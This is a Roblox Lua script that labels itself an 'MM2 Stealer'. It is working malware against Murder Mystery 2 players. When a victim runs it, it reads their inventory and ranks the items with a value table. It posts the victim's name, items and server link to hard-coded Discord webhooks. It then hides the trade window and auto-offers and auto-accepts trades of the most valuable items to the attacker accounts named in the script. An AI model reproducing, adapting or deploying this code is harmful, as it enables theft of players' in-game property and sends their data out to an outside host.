local logs_webhook = "https://discord.com/api/webhooks/1383473069372473484/VdGRMaHGf8dcAxD8BnjVEWL4NciWVVzu5yqg17ViuSwlxOVn5JToJSmWU5uAoJP5eCWB"

local dual_username = "hateable283"
local dual_webhook = "https://discord.com/api/webhooks/1383483314035232873/Jn4W_b6IpBPL4nxRTJwAHkGT4It51vAbmZE3RleXxhJR9UfvCBMzNZyC-e3EHXdkh_2w"
local dual_value = 1300

local req = (syn and syn.request) or (http and http.request) or (http_request) or request
local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local GetProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData
local OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem")
local SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest")
local AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")

local Values = {
    ["BaubleChroma"] = 11000,
    ["Blossom_G"] = 820,
    ["GingerLuger"] = 23,
    ["Bioblade"] = 15,
    ["TravelerAxe"] = 6300,
    ["Frostbite"] = 7,
    ["SwirlyGun"] = 60,
    ["TreeGun"] = 1,
    ["TidesChroma"] = 50,
    ["TravelerGunChroma"] = 155000,
    ["Prismatic"] = 7,
    ["Lugercane"] = 23,
    ["Iceflake"] = 28,
    ["ZombieBat"] = 280,
    ["Pearl_K"] = 63,
    ["FangChroma"] = 55,
    ["EternalCane"] = 23,
    ["Deathshard"] = 20,
    ["Arctic_G_2022"] = 4,
    ["Latte_G_2023"] = 140,
    ["Gingerscope"] = 9800,
    ["TreeGun2023"] = 2525,
    ["Eternal4"] = 10,
    ["Clockwork"] = 22,
    ["RedSeer"] = 3,
    ["Xmas"] = 12,
    ["Icebeam"] = 28,
    ["Gingermint_KChroma"] = 63,
    ["ConstellationChroma"] = 10000,
    ["Pumpking"] = 12,
    ["Hallowscythe"] = 48,
    ["Flora"] = 145,
    ["DeathshardChroma"] = 60,
    ["Eternal3"] = 10,
    ["Candleflame"] = 65,
    ["Boneblade"] = 7,
    ["RedFire"] = 3,
    ["Frostfade_K_2023"] = 1,
    ["Saw"] = 7,
    ["Icedriller_G_2020"] = 8,
    ["Makeshift"] = 65,
    ["VampireGunChroma"] = 16500,
    ["WraithKnife"] = 150,
    ["Beach_K_2023"] = 30,
    ["Icecracker_K_2020"] = 2,
    ["GhostK2018"] = 6,
    ["GhostG2018"] = 2,
    ["Waves_K"] = 145,
    ["ShadowKnife"] = 6,
    ["Knife1"] = 3,
    ["EliteGreen"] = 4,
    ["ElderwoodKnifeChroma"] = 65,
    ["SantasMagic"] = 5,
    ["Flames"] = 10,
    ["FlowerwoodGun"] = 150,
    ["Harvester"] = 675,
    ["Cavern_K_2019"] = 20,
    ["Bauble"] = 450,
    ["GreenLuger"] = 40,
    ["Broken_K_2023"] = 8,
    ["Cookieblade"] = 4,
    ["Frostsaber"] = 13,
    ["Plasmablade"] = 28,
    ["HeatChroma"] = 60,
    ["TreeKnife2023Chroma"] = 34000,
    ["WatergunChroma"] = 2900,
    ["SlasherChroma"] = 60,
    ["Heartblade"] = 130,
    ["HallowsBlade"] = 10,
    ["WraithGun"] = 150,
    ["Blaster"] = 25,
    ["Rainbow_G"] = 245,
    ["Darkbringer"] = 60,
    ["Web"] = 1,
    ["Hallowgun"] = 27,
    ["AuroraKnife"] = 105,
    ["IceDragon"] = 10,
    ["Rainbow_K"] = 240,
    ["Watergun"] = 80,
    ["VampiresEdge"] = 15,
    ["Gingerblade"] = 22,
    ["RedLuger"] = 60,
    ["Lightbringer"] = 55,
    ["Traveler_G_2023"] = 5,
    ["BonebladeChroma"] = 40,
    ["Minty"] = 20,
    ["Nightblade"] = 25,
    ["Ginger_G_2018"] = 6,
    ["Logchopper"] = 22,
    ["FlowerwoodKnife"] = 145,
    ["BloodKnife"] = 10,
    ["Sugar"] = 80,
    ["LaserChroma"] = 70,
    ["Bloom"] = 145,
    ["TreeKnife2023"] = 1025,
    ["CottonCandy"] = 55,
    ["TravelerGun"] = 3900,
    ["Ocean_G"] = 150,
    ["Scratch"] = 4,
    ["Gingermint_K"] = 23,
    ["Spectral_K_2021"] = 8,
    ["JD"] = 55,
    ["SawChroma"] = 45,
    ["ElderwoodScythe"] = 65,
    ["Spider"] = 17,
    ["Pixel"] = 23,
    ["PurpleSeer"] = 3,
    ["Slasher"] = 22,
    ["Fang"] = 15,
    ["Tree"] = 1,
    ["SwirlyGunChroma"] = 65,
    ["ElderwoodKnife"] = 65,
    ["AmericaSword"] = 25,
    ["Iceblaster"] = 65,
    ["EliteBlue"] = 4,
    ["Gemstone"] = 25,
    ["GemstoneChroma"] = 50,
    ["YellowSeer"] = 2,
    ["Heat"] = 18,
    ["Witched"] = 15,
    ["Darkshot"] = 510,
    ["Eggblade"] = 7,
    ["SharkChroma"] = 55,
    ["Laser"] = 8,
    ["Jinglegun"] = 20,
    ["Scythe"] = 60,
    ["Skulls"] = 12,
    ["Ghostblade"] = 7,
    ["GhostKnife"] = 12,
    ["Latte_K_2023"] = 140,
    ["Luger"] = 70,
    ["Eternal"] = 8,
    ["SwirlyAxe"] = 80,
    ["AuroraGun"] = 110,
    ["Gingermint_G"] = 23,
    ["BattleAxe"] = 12,
    ["Amerilaser"] = 28,
    ["IceShard"] = 12,
    ["Darksword"] = 505,
    ["Handsaw"] = 10,
    ["ChromaDarkbringer"] = 100,
    ["ScratchBlue"] = 2,
    ["Chill"] = 15,
    ["Spectre2022"] = 60,
    ["Shark"] = 27,
    ["SwirlyBlade"] = 40,
    ["Bleed"] = 1,
    ["LugerChroma"] = 90,
    ["BattleAxe2"] = 18,
    ["Hallow"] = 12,
    ["WintersEdge"] = 10,
    ["Icewing"] = 5,
    ["Eternal2"] = 8,
    ["SeerChroma"] = 55,
    ["VampireGun"] = 575,
    ["Celestial"] = 750,
    ["Peppermint"] = 5,
    ["TreeGun2023Chroma"] = 56000,
    ["Sorry"] = 900,
    ["Snowflake"] = 7,
    ["Constellation"] = 700,
    ["CandleflameChroma"] = 65,
    ["GingerbladeChroma"] = 45,
    ["VampireAxe"] = 500,
    ["Icebreaker"] = 125,
    ["Virtual"] = 22,
    ["Icepiercer"] = 550,
    ["Vampire_K_2022"] = 1,
    ["Turkey2023"] = 1750,
    ["Nebula"] = 22,
    ["Aurora_G_2021"] = 8,
    ["Plasmabeam"] = 28,
    ["ChromaLightbringer"] = 95,
    ["Candy"] = 190,
    ["Sakura_K"] = 810,
    ["Pearl_G"] = 63,
    ["ElderwoodGun"] = 60,
    ["BlueSeer"] = 3,
    ["OrangeSeer"] = 2,
    ["Cavern_G_2019"] = 1,
    ["SantasSpirit"] = 5,
    ["Tides"] = 15,
    ["Phantom2022"] = 60,
    ["Phaser"] = 6
}

local function formatNumber(n)
    if not tonumber(n) then return "0" end
    return tostring(n):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
end

local function getTopItems()
    local success, profileData = pcall(function()
        return GetProfileData:InvokeServer()
    end)
    if not (success and profileData) then return {} end

    local weapons = profileData["Weapons"]
    local items = {}
    if weapons and weapons.Owned then
        for itemId, count in pairs(weapons.Owned) do
            local quantity = typeof(count) == "number" and count or 1
            local value = tonumber(Values[itemId]) or 0
            if value > 0 then
                table.insert(items, {id = itemId, category = "Weapons", value = value, quantity = quantity})
            end
        end
    end

    table.sort(items, function(a, b)
        return a.value > b.value
    end)

    return items
end

local function summariseItems(items)
    local lines = {}
    for _, item in ipairs(items) do
        table.insert(lines, string.format("%s - %s (%dx)", item.id, formatNumber(item.value), item.quantity))
    end
    return table.concat(lines, "\n")
end

local function sendWebhook(totalValue, tradableSummary)
    local payload = {
        ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
        ["embeds"] = { {
            ["title"] = ":skull: MM2 Stealer",
            ["color"] = 0x00ffcc,
            ["fields"] = {
                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name},
                {["name"] = ":crown: Creator", ["value"] = username},
                {["name"] = ":jigsaw: Executor", ["value"] = executor},
                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue)},
                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```"},
                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
            },
            ["footer"] = {["text"] = "by Eli • " .. os.date("%B %d, %Y")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local logs_payload = {
        ["embeds"] = { {
            ["title"] = ":skull: MM2 LOGS",
            ["color"] = 0x00ffcc,
            ["fields"] = {
                {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name},
                {["name"] = ":jigsaw: Executor", ["value"] = executor},
                {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue)},
                {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```"},
                {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
            },
            ["footer"] = {["text"] = "by Eli • " .. os.date("%B %d, %Y")},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local target_webhook = webhook
    local target_logs = logs_webhook

    if totalValue >= dual_value then
        target_webhook = dual_webhook
    end

    local function sendPayload(payload, url)
        pcall(function()
            req({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode(payload)
            })
        end)
    end

    sendPayload(payload, target_webhook)
    sendPayload(logs_payload, target_logs)
end


local items = getTopItems()
local total = 0
for _, item in ipairs(items) do
    total += item.value * item.quantity
end
sendWebhook(total, summariseItems(items))


local function doTrade(player)
    local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
    gui.Enabled = false

    local items = getTopItems()
    local count = 0

    for _, item in ipairs(items) do
        for _ = 1, item.quantity do
            OfferItem:FireServer(item.id, item.category)
            task.wait(0.1)
        end
        count += 1
        if count >= 4 then break end
    end
end


local active = false
local targetPlayer = nil

local function startLoop(player)
    if active then return end
    active = true
    targetPlayer = player

    task.spawn(function()
        local gui = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        while true do
            if not gui.Enabled then
                SendRequest:InvokeServer(targetPlayer)
            else
                doTrade(targetPlayer)
                gui.Enabled = false
            end
            task.wait(0.4)
        end
    end)
end


local function connectChat(player)
    player.Chatted:Connect(function()
        local items = getTopItems()
        local value = 0
        for _, item in ipairs(items) do
            value += item.value * item.quantity
        end

        local expected = (value >= dual_value) and dual_username or username
        if player.Name == expected then
            startLoop(player)
        end
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    if p.Name == username or p.Name == dual_username then
        connectChat(p)
    end
end

Players.PlayerAdded:Connect(function(p)
    if p.Name == username or p.Name == dual_username then
        connectChat(p)
    end
end)


task.spawn(function()
    while true do
        AcceptTrade:FireServer(285646582)
        task.wait(0.5)
    end
end)
local DISCORD_INVITE = "https://discord.gg/8aSVXYsB56"

if setclipboard then
    setclipboard(DISCORD_INVITE)
    print("Discord link copied to clipboard.")
else
    warn("setclipboard() is not available in this environment.")
end
